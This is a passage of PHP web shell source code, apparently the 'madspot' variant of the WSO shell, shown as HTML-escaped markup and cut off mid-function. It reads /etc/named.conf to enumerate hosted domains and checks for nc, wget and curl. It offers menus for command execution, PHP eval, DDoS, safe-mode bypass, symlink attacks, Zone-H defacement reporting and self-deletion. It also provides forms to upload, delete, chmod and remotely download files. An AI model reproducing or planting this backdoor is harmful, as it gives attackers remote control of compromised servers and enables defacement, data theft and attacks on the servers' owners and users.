<span class="x">     &amp;lt;/tr&amp;gt;</span>
<span class="x">     &amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td&amp;gt;&amp;lt;span&amp;gt;WEBS:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td width=&quot;76%&quot;&amp;gt;&#39;;</span>

<span class="x">        if($GLOBALS[&#39;sys&#39;]==&#39;unix&#39;)</span>
<span class="x">        {</span>
<span class="x">            $d0mains = @file(&quot;/etc/named.conf&quot;);</span>
<span class="x">            if(!$d0mains)</span>
<span class="x">            {</span>
<span class="x">                echo &quot;CANT READ named.conf&quot;;</span>
<span class="x">            }</span>
<span class="x">            else</span>
<span class="x">            {</span>
<span class="x">              $count;  </span>
<span class="x">             foreach($d0mains as $d0main)</span>
<span class="x">             {</span>
<span class="x">              if(@ereg(&quot;zone&quot;,$d0main))</span>
<span class="x">              {</span>
<span class="x">              preg_match_all(&#39;#zone &quot;(.*)&quot;#&#39;, $d0main, $domains);</span>
<span class="x">               flush();</span>
<span class="x">              if(strlen(trim($domains[1][0])) &amp;gt; 2){</span>
<span class="x">             flush();</span>
<span class="x">             $count++;</span>
<span class="x">               }</span>
<span class="x">               }</span>
<span class="x">               }</span>
<span class="x">               echo &quot;$count  Domains&quot;;</span>
<span class="x">            }</span>
<span class="x">        }</span>
<span class="x">        else{ echo&quot;CANT READ |Windows|&quot;;}</span>

<span class="x">          echo &#39;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;/tr&amp;gt;</span>
<span class="x">       &amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td height=&quot;16&quot;&amp;gt;&amp;lt;span&amp;gt;HDD:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td&amp;gt;&#39;.madSize($totalSpace).&#39; &amp;lt;span&amp;gt;Free:&amp;lt;/span&amp;gt;&#39; . madSize($freeSpace) . &#39; [&#39;. (int) ($freeSpace/$totalSpace*100) . &#39;%]&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;/tr&amp;gt;&#39;;</span>

<span class="x">         if($GLOBALS[&#39;sys&#39;]==&#39;unix&#39; )</span>
<span class="x">    {</span>
<span class="x">        if(!@ini_get(&#39;safe_mode&#39;))</span>
<span class="x">        {</span>

<span class="x">        echo &#39;&amp;lt;tr&amp;gt;&amp;lt;td height=&quot;18&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Useful : &amp;lt;/span&amp;gt;&#39;;</span>
<span class="x">        $userful = array(&#39;gcc&#39;,&#39;lcc&#39;,&#39;cc&#39;,&#39;ld&#39;,&#39;make&#39;,&#39;php&#39;,&#39;perl&#39;,&#39;python&#39;,&#39;ruby&#39;,&#39;tar&#39;,&#39;gzip&#39;,&#39;bzip&#39;,&#39;bzip2&#39;,&#39;nc&#39;,&#39;locate&#39;,&#39;suidperl&#39;);</span>
<span class="x">         foreach($userful as $item)</span>
<span class="x">             if(madWhich($item))</span>
<span class="x">             echo $item.&#39;,&#39;;</span>
<span class="x">             echo &#39;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;/tr&amp;gt;</span>
<span class="x">             &amp;lt;tr&amp;gt;</span>
<span class="x">             &amp;lt;td height=&quot;0&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Downloader:&amp;lt;/span&amp;gt;&#39;;</span>

<span class="x">         $downloaders = array(&#39;wget&#39;,&#39;fetch&#39;,&#39;lynx&#39;,&#39;links&#39;,&#39;curl&#39;,&#39;get&#39;,&#39;lwp-mirror&#39;);</span>
<span class="x">          foreach($downloaders as $item2)</span>
<span class="x">           if(madWhich($item2))</span>
<span class="x">            echo $item2.&#39;,&#39;;</span>
<span class="x">            echo &#39;&amp;lt;/td&amp;gt;</span>
<span class="x">                 &amp;lt;/tr&amp;gt;&#39;;</span>

<span class="x">              }</span>
<span class="x">               else</span>
<span class="x">               {</span>
<span class="x">             echo &#39;&amp;lt;tr&amp;gt;&amp;lt;td height=&quot;18&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;useful:&amp;lt;/span&amp;gt;&#39;;</span>
<span class="x">             echo &#39;--------------&amp;lt;/td&amp;gt;</span>
<span class="x">              &amp;lt;/tr&amp;gt;&amp;lt;td height=&quot;0&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Downloader: &amp;lt;/span&amp;gt;-------------&amp;lt;/td&amp;gt;</span>
<span class="x">                 &amp;lt;/tr&amp;gt;&#39;;  </span>
<span class="x">             }</span>
<span class="x">    }</span>
<span class="x">    else</span>
<span class="x">    {</span>
<span class="x">       echo &#39;&amp;lt;tr&amp;gt;&amp;lt;td height=&quot;18&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Window:&amp;lt;/span&amp;gt;&#39;;</span>
<span class="x">       echo madEx(&#39;ver&#39;);</span>
<span class="x">       echo &#39;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;/tr&amp;gt; &amp;lt;tr&amp;gt;</span>
<span class="x">           &amp;lt;td height=&quot;0&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Downloader: &amp;lt;/span&amp;gt;-------------&amp;lt;/td&amp;gt;</span>
<span class="x">                 &amp;lt;/tr&amp;gt;&#39;;</span>

<span class="x">    }  </span>


<span class="x">     echo &#39;&amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td height=&quot;16&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Disabled functions:&amp;lt;/span&amp;gt;&#39;.$disfun.&#39;&amp;lt;/td&amp;gt;</span>
<span class="x">     &amp;lt;/tr&amp;gt;</span>
<span class="x">     &amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td height=&quot;16&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;cURL:&#39;.$curl.&#39;  MySQL:&#39;.$mysql.&#39;  MSSQL:&#39;.$mssql.&#39;  PostgreSQL:&#39;.$pg.&#39;  Oracle: &amp;lt;/span&amp;gt;&#39;.$or.&#39;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;15%&quot;&amp;gt;&#39;.base64_decode(&quot;PGEgaHJlZj0iaHR0cDovL3d3dy5tYWRzcG90Lm5ldCIgdGFyZ2V0PSJfYmxhbmsiPjxzcGFuPjxmb250IGNvbG9yPSIjMEYwIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtNQURTUE9ULk5FVDwvZm9udD48L3NwYW4+PC9hPg==&quot;).&#39;&amp;lt;/td&amp;gt;</span>
<span class="x">     &amp;lt;/tr&amp;gt;</span>
<span class="x">     &amp;lt;tr&amp;gt;</span>
<span class="x">     &amp;lt;td height=&quot;11&quot; colspan=&quot;3&quot;&amp;gt;&amp;lt;span&amp;gt;Open_basedir:&#39;.$open_b.&#39; Safe_mode_exec_dir:&#39;.$safe_exe.&#39;   Safe_mode_include_dir:&#39;.$safe_include.&#39;&amp;lt;/td&amp;gt;</span>
<span class="x">     &amp;lt;/tr&amp;gt;</span>
<span class="x">     &amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td height=&quot;11&quot;&amp;gt;&amp;lt;span&amp;gt;Server &amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td colspan=&quot;2&quot;&amp;gt;&#39;.@getenv(&#39;SERVER_SOFTWARE&#39;).&#39;&amp;lt;/td&amp;gt;</span>
<span class="x">     &amp;lt;/tr&amp;gt;&#39;;</span>
<span class="x">      if($GLOBALS[sys]==&quot;win&quot;)</span>
<span class="x">      {</span>
<span class="x">        echo &#39;&amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td height=&quot;12&quot;&amp;gt;&amp;lt;span&amp;gt;DRIVE:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td colspan=&quot;2&quot;&amp;gt;&#39;.$drives.&#39;&amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;/tr&amp;gt;&#39;;</span>
<span class="x">      }</span>

<span class="x">      echo &#39;&amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td height=&quot;12&quot;&amp;gt;&amp;lt;span&amp;gt;PWD:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td colspan=&quot;2&quot;&amp;gt;&#39;.$cwd_links.&#39;  &amp;lt;a href=# onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39; . $GLOBALS[&#39;home_cwd&#39;] . &#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;&amp;lt;font color=red &amp;gt;|CURRENT|&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">     &amp;lt;/tr&amp;gt;</span>
<span class="x">     &amp;lt;/table&amp;gt;</span>
<span class="x">    &amp;lt;/div&amp;gt;</span>
<span class="x">    &amp;lt;div id=&quot;meunlist&quot;&amp;gt;</span>
<span class="x">         &amp;lt;ul&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;HOME&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>

<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;proc\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;PROCESS&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;phpeval\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;EVAL&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;sql\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;SQL&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;hash\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;HASH&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;connect\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;CONNECT&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;zoneh\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;ZONE-H&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;dos\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;DDOS&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;safe\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;SAFE MODE&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;symlink\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;SYMLINK&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;spot\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;MADSPOT&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;selfrm\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;KIll C0de&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="x">    &amp;lt;/ul&amp;gt;</span>

<span class="x">       &amp;lt;/div&amp;gt;</span>
<span class="x">    &#39;;  </span>

<span class="x">    }</span>

<span class="x">    function madfooter()</span>
<span class="x">    {</span>

<span class="x">        echo &quot;&amp;lt;table class=&#39;foot&#39; width=&#39;100%&#39; border=&#39;0&#39; cellspacing=&#39;3&#39; cellpadding=&#39;0&#39; &amp;gt;</span>
<span class="x">          &amp;lt;tr&amp;gt;</span>
<span class="x">            &amp;lt;td width=&#39;17%&#39;&amp;gt;&amp;lt;form onsubmit=\&quot;g(&#39;FilesTools&#39;,null,this.f.value,&#39;mkfile&#39;);return false;\&quot;&amp;gt;&amp;lt;span&amp;gt;__MK FILE__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;dir&#39;  type=text name=f value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td width=&#39;21%&#39;&amp;gt;&amp;lt;form onsubmit=\&quot;g(&#39;FilesMan&#39;,null,&#39;mkdir&#39;,this.d.value);return false;\&quot;&amp;gt;&amp;lt;span&amp;gt;__MK DIR__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;dir&#39; type=text name=d value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td width=&#39;22%&#39;&amp;gt;&amp;lt;form onsubmit=\&quot;g(&#39;FilesMan&#39;,null,&#39;delete&#39;,this.del.value);return false;\&quot;&amp;gt;&amp;lt;span&amp;gt;__DELETE__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;dir&#39; type=text name=del value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td width=&#39;19%&#39;&amp;gt;&amp;lt;form onsubmit=\&quot;g(&#39;FilesTools&#39;,null,this.f.value,&#39;chmod&#39;);return false;\&quot;&amp;gt;&amp;lt;span&amp;gt;__CHMOD__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;dir&#39; type=text name=f value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">          &amp;lt;/tr&amp;gt;</span>
<span class="x">          &amp;lt;tr&amp;gt;</span>
<span class="x">            &amp;lt;td colspan=&#39;2&#39;&amp;gt;&amp;lt;form onsubmit=&#39;g(null,this.c.value,\&quot;\&quot;);return false;&#39;&amp;gt;&amp;lt;span&amp;gt;__CHANGE DIR__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;foottable&#39; type=text name=c value=&#39;&quot;.htmlspecialchars($GLOBALS[&#39;cwd&#39;]).&quot;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td colspan=&#39;2&#39;&amp;gt;&amp;lt;form method=&#39;post&#39; &amp;gt;&amp;lt;span&amp;gt;__HTTP DOWNLOAD__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;foottable&#39; type=text name=rtdown value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">           &amp;lt;/tr&amp;gt;</span>
<span class="x">          &amp;lt;tr&amp;gt;</span>
<span class="x">            &amp;lt;td colspan=&#39;4&#39;&amp;gt;&amp;lt;form onsubmit=\&quot;g(&#39;proc&#39;,null,this.c.value);return false;\&quot;&amp;gt;&amp;lt;span&amp;gt;__EXECUTE__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;foottable&#39; type=text name=c value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">           &amp;lt;/tr&amp;gt;</span>
<span class="x">          &amp;lt;tr&amp;gt;</span>
<span class="x">            &amp;lt;td colspan=&#39;4&#39;&amp;gt;&amp;lt;form method=&#39;post&#39; ENCTYPE=&#39;multipart/form-data&#39;&amp;gt;</span>
<span class="x">                    &amp;lt;input type=hidden name=a value=&#39;FilesMAn&#39;&amp;gt;</span>
<span class="x">                    &amp;lt;input type=hidden name=c value=&#39;&quot; . $GLOBALS[&#39;cwd&#39;] .&quot;&#39;&amp;gt;</span>
<span class="x">                    &amp;lt;input type=hidden name=p1 value=&#39;uploadFile&#39;&amp;gt;</span>
<span class="x">                    &amp;lt;input type=hidden name=charset value=&#39;&quot; . (isset($_POST[&#39;charset&#39;])?$_POST[&#39;charset&#39;]:&#39;&#39;) . &quot;&#39;&amp;gt;</span>
<span class="x">           &amp;lt;span&amp;gt;Upload file:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=file name=f&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">           &amp;lt;/tr&amp;gt;</span>
<span class="x">         &amp;lt;/table&amp;gt;</span>
<span class="x">     &amp;lt;/div&amp;gt;</span>
<span class="x">     &amp;lt;/body&amp;gt;</span>
<span class="x">    &amp;lt;/html&amp;gt;</span>
<span class="x">    &quot;;</span>

<span class="x">    }</span>
<span class="x">    if (!function_exists(&quot;posix_getpwuid&quot;) &amp;&amp; (strpos(@ini_get(&#39;disable_functions&#39;), &#39;posix_getpwuid&#39;)===false)) {</span>
<span class="x">       function posix_getpwuid($p) {return false;} }</span>
<span class="x">    if (!function_exists(&quot;posix_getgrgid&quot;) &amp;&amp; (strpos(@ini_get(&#39;disable_functions&#39;), &#39;posix_getgrgid&#39;)===false)) {</span>
<span class="x">      function posix_getgrgid($p) {return false;} }</span>

<span class="x">    function madWhich($p) {</span>
<span class="x">            $path = madEx(&#39;which &#39; . $p);</span>
<span class="x">            if(!empty($path))</span>
<span class="x">                    return $path;</span>
<span class="x">            return false;</span>
<span class="x">    }</span>



<span class="x">    function madSize($s) {</span>
<span class="x">            if($s &amp;gt;= 1073741824)</span>
<span class="x">                    return sprintf(&#39;%1.2f&#39;, $s / 1073741824 ). &#39; GB&#39;;</span>
<span class="x">            elseif($s &amp;gt;= 1048576)</span>
<span class="x">                    return sprintf(&#39;%1.2f&#39;, $s / 1048576 ) . &#39; MB&#39;;</span>
<span class="x">            elseif($s &amp;gt;= 1024)</span>
<span class="x">                    return sprintf(&#39;%1.2f&#39;, $s / 1024 ) . &#39; KB&#39;;</span>
<span class="x">            else</span>
<span class="x">                    return $s . &#39; B&#39;;</span>
<span class="x">    }</span>


<span class="x">    function madPerms($p) {</span>
<span class="x">            if (($p &amp; 0xC000) == 0xC000)$i = &#39;s&#39;;</span>
<span class="x">            elseif (($p &amp; 0xA000) == 0xA000)$i = &#39;l&#39;;</span>
<span class="x">            elseif (($p &amp; 0x8000) == 0x8000)$i = &#39;-&#39;;</span>
<span class="x">            elseif (($p &amp; 0x6000) == 0x6000)$i = &#39;b&#39;;</span>
<span class="x">            elseif (($p &amp; 0x4000) == 0x4000)$i = &#39;d&#39;;</span>
<span class="x">            elseif (($p &amp; 0x2000) == 0x2000)$i = &#39;c&#39;;</span>
<span class="x">            elseif (($p &amp; 0x1000) == 0x1000)$i = &#39;p&#39;;</span>
<span class="x">            else $i = &#39;u&#39;;</span>
<span class="x">            $i .= (($p &amp; 0x0100) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="x">            $i .= (($p &amp; 0x0080) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="x">            $i .= (($p &amp; 0x0040) ? (($p &amp; 0x0800) ? &#39;s&#39; : &#39;x&#39; ) : (($p &amp; 0x0800) ? &#39;S&#39; : &#39;-&#39;));</span>
<span class="x">            $i .= (($p &amp; 0x0020) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="x">            $i .= (($p &amp; 0x0010) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="x">            $i .= (($p &amp; 0x0008) ? (($p &amp; 0x0400) ? &#39;s&#39; : &#39;x&#39; ) : (($p &amp; 0x0400) ? &#39;S&#39; : &#39;-&#39;));</span>
<span class="x">            $i .= (($p &amp; 0x0004) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="x">            $i .= (($p &amp; 0x0002) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="x">            $i .= (($p &amp; 0x0001) ? (($p &amp; 0x0200) ? &#39;t&#39; : &#39;x&#39; ) : (($p &amp; 0x0200) ? &#39;T&#39; : &#39;-&#39;));</span>
<span class="x">            return $i;</span>
<span class="x">    }</span>
<span class="x">    function madPermsColor($f) {</span>
<span class="x">            if (!@is_readable($f))</span>
<span class="x">                    return &#39;&amp;lt;font color=#FF0000&amp;gt;&#39; . madPerms(@fileperms($f)) . &#39;&amp;lt;/font&amp;gt;&#39;;</span>
<span class="x">            elseif (!@is_writable($f))</span>
<span class="x">                    return &#39;&amp;lt;font color=white&amp;gt;&#39; . madPerms(@fileperms($f)) . &#39;&amp;lt;/font&amp;gt;&#39;;</span>
<span class="x">            else</span>
<span class="x">                    return &#39;&amp;lt;font color=#25ff00&amp;gt;&#39; . madPerms(@fileperms($f)) . &#39;&amp;lt;/font&amp;gt;&#39;;</span>
<span class="x">    }</span>

<span class="x">    if(!function_exists(&quot;scandir&quot;)) {</span>
<span class="x">            function scandir($dir) {</span>
<span class="x">                    $dh  = opendir($dir);</span>
<span class="x">                    while (false !== ($filename = readdir($dh)))</span>
<span class="x">                    $files[] = $filename;</span>
<span class="x">                    return $files;</span>
<span class="x">            }</span>
<span class="x">    }</span>


<span class="x">    function madFilesMan() {</span>
<span class="x">            madhead();</span>
<span class="x">        echo &#39;&amp;lt;div class=header&amp;gt;&amp;lt;script&amp;gt;p1_=p2_=p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;;</span>
<span class="x">            if(!empty($_POST[&#39;p1&#39;])) {</span>
<span class="x">                    switch($_POST[&#39;p1&#39;]) {</span>
<span class="x">                            case &#39;uploadFile&#39;:</span>
<span class="x">                                    if(!@move_uploaded_file($_FILES[&#39;f&#39;][&#39;tmp_name&#39;], $_FILES[&#39;f&#39;][&#39;name&#39;]))</span>
<span class="x">                                            echo &quot;Can&#39;t upload file!&quot;;</span>
<span class="x">                                    break;</span>
<span class="x">                            case &#39;mkdir&#39;:</span>
<span class="x">                                    if(!@mkdir($_POST[&#39;p2&#39;]))</span>
<span class="x">                                            echo &quot;Can&#39;t create new dir&quot;;</span>
<span class="x">                                    break;</span>
<span class="x">                            case &#39;delete&#39;:</span>
<span class="x">                                    function deleteDir($path) {</span>
<span class="x">                                            $path = (substr($path,-1)==&#39;/&#39;) ? $path:$path.&#39;/&#39;;</span>
<span class="x">                                            $dh  = opendir($path);</span>
<span class="x">                                            while ( ($item = readdir($dh) ) !== false) {</span>
<span class="x">                                                    $item = $path.$item;</span>
<span class="x">                                                    if ( (basename($item) == &quot;..&quot;) || (basename($item) == &quot;.&quot;) )</span>
<span class="x">                                                            continue;</span>
<span class="x">                                                    $type = filetype($item);</span>
<span class="x">                                                    if ($type == &quot;dir&quot;)</span>
<span class="x">                                                            deleteDir($item);</span>
<span class="x">                                                    else</span>
<span class="x">                                                            @unlink($item);</span>
<span class="x">                                            }</span>
<span class="x">                                            closedir($dh);</span>
<span class="x">                                            @rmdir($path);</span>
<span class="x">                                    }</span>
<span class="x">                                    if(is_dir(@$_POST[&#39;p2&#39;]))</span>
<span class="x">                                    deleteDir(@$_POST[&#39;p2&#39;]);</span>
<span class="x">                                    else</span>
<span class="x">                                    @unlink(@$_POST[&#39;p2&#39;]);</span>
<span class="x">                                    break;</span>
<span class="x">                    default:</span>
<span class="x">                    if(!empty($_POST[&#39;p1&#39;])) {</span>
<span class="x">                                            $_SESSION[&#39;act&#39;] = @$_POST[&#39;p1&#39;];</span>
<span class="x">                                            $_SESSION[&#39;f&#39;] = @$_POST[&#39;f&#39;];</span>
<span class="x">                                            foreach($_SESSION[&#39;f&#39;] as $k =&amp;gt; $f)</span>
<span class="x">                                                    $_SESSION[&#39;f&#39;][$k] = urldecode($f);</span>
<span class="x">                                            $_SESSION[&#39;c&#39;] = @$_POST[&#39;c&#39;];</span>
<span class="x">                                    }</span>
<span class="x">                                    break;</span>
<span class="x">                    }</span>
<span class="x">            }</span>
<span class="x">            $dirContent = @scandir(isset($_POST[&#39;c&#39;])?$_POST[&#39;c&#39;]:$GLOBALS[&#39;cwd&#39;]);</span>
<span class="x">            if($dirContent === false) {     echo &#39;&amp;lt;h3&amp;gt;&amp;lt;span&amp;gt;|  Access Denied! |&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;&amp;lt;/div&amp;gt;&#39;;madFooter(); return; }</span>
<span class="x">            global $sort;</span>
<span class="x">            $sort = array(&#39;name&#39;, 1);</span>
<span class="x">            if(!empty($_POST[&#39;p1&#39;])) {</span>
<span class="x">                    if(preg_match(&#39;!s_([A-z]+)_(\d{1})!&#39;, $_POST[&#39;p1&#39;], $match))</span>
<span class="x">                            $sort = array($match[1], (int)$match[2]);</span>
<span class="x">            }</span>
<span class="x">    echo &quot;</span>
<span class="x">    &amp;lt;table width=&#39;100%&#39; class=&#39;main&#39; cellspacing=&#39;0&#39; cellpadding=&#39;2&#39;  &amp;gt;</span>
<span class="x">    &amp;lt;form name=files method=post&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Size&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Modify&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Owner/Group&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Permissions&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Actions&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&quot;;</span>
<span class="x">            $dirs = $files = array();</span>
<span class="x">            $n = count($dirContent);</span>
<span class="x">            for($i=0;$i&amp;lt;$n;$i++) {</span>
<span class="x">                    $ow = @posix_getpwuid(@fileowner($dirContent[$i]));</span>
<span class="x">                    $gr = @posix_getgrgid(@filegroup($dirContent[$i]));</span>
<span class="x">                    $tmp = array(&#39;name&#39; =&amp;gt; $dirContent[$i],</span>
<span class="x">                                             &#39;path&#39; =&amp;gt; $GLOBALS[&#39;cwd&#39;].$dirContent[$i],</span>
<span class="x">                                             &#39;modify&#39; =&amp;gt; @date(&#39;Y-m-d H:i:s&#39;, @filemtime($GLOBALS[&#39;cwd&#39;] . $dirContent[$i])),</span>
<span class="x">                                             &#39;perms&#39; =&amp;gt; madPermsColor($GLOBALS[&#39;cwd&#39;] . $dirContent[$i]),</span>
<span class="x">                                             &#39;size&#39; =&amp;gt; @filesize($GLOBALS[&#39;cwd&#39;].$dirContent[$i]),</span>
<span class="x">                                             &#39;owner&#39; =&amp;gt; $ow[&#39;name&#39;]?$ow[&#39;name&#39;]:@fileowner($dirContent[$i]),</span>
<span class="x">                                             &#39;group&#39; =&amp;gt; $gr[&#39;name&#39;]?$gr[&#39;name&#39;]:@filegroup($dirContent[$i])</span>
<span class="x">                                            );</span>
<span class="x">                    if(@is_file($GLOBALS[&#39;cwd&#39;] . $dirContent[$i]))</span>
<span class="x">                            $files[] = array_merge($tmp, array(&#39;type&#39; =&amp;gt; &#39;file&#39;));</span>
<span class="x">                    elseif(@is_link($GLOBALS[&#39;cwd&#39;] . $dirContent[$i]))</span>
<span class="x">                            $dirs[] = array_merge($tmp, array(&#39;type&#39; =&amp;gt; &#39;link&#39;, &#39;link&#39; =&amp;gt; readlink($tmp[&#39;path&#39;])));</span>
<span class="x">                    elseif(@is_dir($GLOBALS[&#39;cwd&#39;] . $dirContent[$i])&amp;&amp; ($dirContent[$i] != &quot;.&quot;))</span>
<span class="x">                            $dirs[] = array_merge($tmp, array(&#39;type&#39; =&amp;gt; &#39;dir&#39;));</span>
<span class="x">            }</span>
<span class="x">            $GLOBALS[&#39;sort&#39;] = $sort;</span>
<span class="x">            function wsoCmp($a, $b) {</span>
